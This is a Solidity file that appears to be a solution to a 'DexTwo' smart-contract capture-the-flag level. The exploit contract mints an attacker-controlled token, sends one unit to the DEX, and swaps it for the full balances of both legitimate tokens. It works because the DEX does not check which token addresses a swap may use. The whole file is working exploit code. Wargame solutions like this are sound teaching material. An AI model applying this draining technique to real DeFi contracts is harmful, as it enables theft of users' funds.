// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./DexTwo.sol";

function playerScript(address instanceAddress) {
    new DexTwoExploit().exploit(instanceAddress);
}

contract DexTwoExploit {
    function exploit(address instanceAddress) public payable {
        DexTwo instance = DexTwo(instanceAddress);
        address token1 = instance.token1();
        address token2 = instance.token2();
        instance.approve(instanceAddress, type(uint256).max);

        SwappableTokenTwo token3Instance = new SwappableTokenTwo(
            instanceAddress,
            "",
            "",
            10000
        );
        address token3 = address(token3Instance);
        token3Instance.approve(instanceAddress, type(uint256).max);
        token3Instance.transfer(instanceAddress, 1);
        instance.swap(token3, token1, 1);
        instance.swap(token3, token2, 2);
    }
}
